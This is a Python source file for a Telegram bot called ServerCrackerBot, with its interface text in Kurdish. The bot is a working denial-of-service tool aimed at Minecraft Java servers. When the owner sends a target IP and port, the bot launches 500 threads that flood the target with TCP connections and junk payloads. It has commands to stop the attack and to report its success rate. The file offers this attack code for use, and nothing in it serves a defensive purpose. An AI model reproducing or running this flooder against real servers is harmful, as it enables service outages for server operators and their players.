import os
import socket
import threading
import sys
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 123456789  # ئایدی تلگرامی خۆت لێرە بنووسە

# دۆخی بەکاربەر بۆ چاوەڕێکردنی IP و Port
user_states = {}
attack_active = False
attack_stats = {"success": 0, "failed": 0}

def flood_worker(ip, port):
    global attack_active, attack_stats
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, int(port)))
            payload = b"\xfe\x01\x02\x03\x04\x05\x06\x07\x08\xff" * 200
            for _ in range(100):
                if not attack_active:
                    break
                s.send(payload)
            attack_stats["success"] += 1
        except Exception:
            attack_stats["failed"] += 1
        finally:
            try:
                s.close()
            except:
                pass

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💀 دەربارەی بۆت", callback_data="about_bot")],
        [InlineKeyboardButton("🔥 هێرش بۆ سێرڤەری Minecraft Java", callback_data="start_attack_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە، ئەی خاوەن:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "about_bot":
        about_text = (
            "💀 **دەربارەی ServerCrackerBot:**\n\n"
            "ئەم بۆتە چەکێکی پێشکەوتووی تێکشکاندن و فڵۆدکردنە کە تایبەتە بە خستنەکار و ڕاگرتنی (Shutdown) سێرڤەرە گەورەکانی ماینکرافت (Java Edition).\n"
            "توانای ناردنی ملیۆنەها پەیوەندی و پاکێتی کوشندەی هەیە لە ڕێگەی فرە تریدینگ و سکریپتی هێرشی پۆڵەنییەوە.\n\n"
            "⚡️ **تەنها بۆ خاوەنە مەزنەکە (@alonee427) کار دەکات!**"
        )
        await query.message.reply_text(about_text)

    elif query.data == "start_attack_menu":
        if user_id != OWNER_ID:
            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت!")
            return
        user_states[user_id] = "waiting_ip_port"
        await query.message.reply_text(
            "🎯 **ئامادەکاری بۆ هێرش:**\n\n"
            "تکایە IP و Port سێرڤەری ماینکرافتەکە بنووسە بەم شێوازە:\n"
            "`<IP> <PORT>`\n"
            "نموونە: `play.server.com 25565`"
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active, attack_stats
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        return

    if user_states.get(user_id) == "waiting_ip_port":
        text = update.message.text.strip()
        parts = text.split()
        if len(parts) < 2:
            await update.message.reply_text("🔥 هەڵە! تکایە هەردووکیشی بە دروستی بنووسە: `IP PORT`")
            return

        ip = parts[0]
        port = parts[1]
        user_states[user_id] = None

        attack_active = True
        attack_stats = {"success": 0, "failed": 0}

        # دەستپێکردنی هەزاران ترید بۆ ناردنی ملیۆنەها پەیوەندی
        threads_count = 500
        for _ in range(threads_count):
            t = threading.Thread(target=flood_worker, args=(ip, port))
            t.daemon = True
            t.start()

        await update.message.reply_text(
            f"🌋 **هێرشی بێبەزەیی بۆڕکان دەستی پێکرد!**\n"
            f"🎯 ئامانج: `{ip}:{port}`\n"
            f"⚡️ بارودۆخ: ملیۆنەها بۆت و پاکێت بەرەو سێرڤەر دەنێردرێن...\n\n"
            f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
            f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
        )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != OWNER_ID:
        return
    
    attack_active = False
    await update.message.reply_text("⏹ **هێرشەکە بە سەرکەوتوویی ڕاگیرا و مەکینە سارد کرایەوە!**")

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    success = attack_stats["success"]
    failed = attack_stats["failed"]
    total = success + failed
    
    success_rate = (success / total * 100) if total > 0 else 0
    
    status_text = (
        "📊 **پشکنینی ڕەوشی هێرش (Server Status):**\n\n"
        f"✅ هێرش و پەیوەندییە سەرکەوتووەکان: `{success}`\n"
        f"❌ هێرشە سەرنەکەوتووەکان (پچڕاو/ڕەتکراوە): `{failed}`\n"
        f"📈 ڕێژەی سەرکەوتنی هێرشەکە: `{success_rate:.2f}%`\n"
        f"⚡️ دۆخی هێرش: {'🔴 لە کاردایە (Active)' if attack_active else '⚪️ وەستاوە'}"
    )
    await update.message.reply_text(status_text)

def main():
    if not TOKEN:
        print("❌ هەڵە: توکنی بۆت نەدۆزراوەتەوە!")
        sys.exit(1)
        
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("💀 بۆتی ServerCrackerBot بە سەرکەوتوویی کەوتە کار...")
    app.run_polling()

if __name__ == "__main__":
    main()
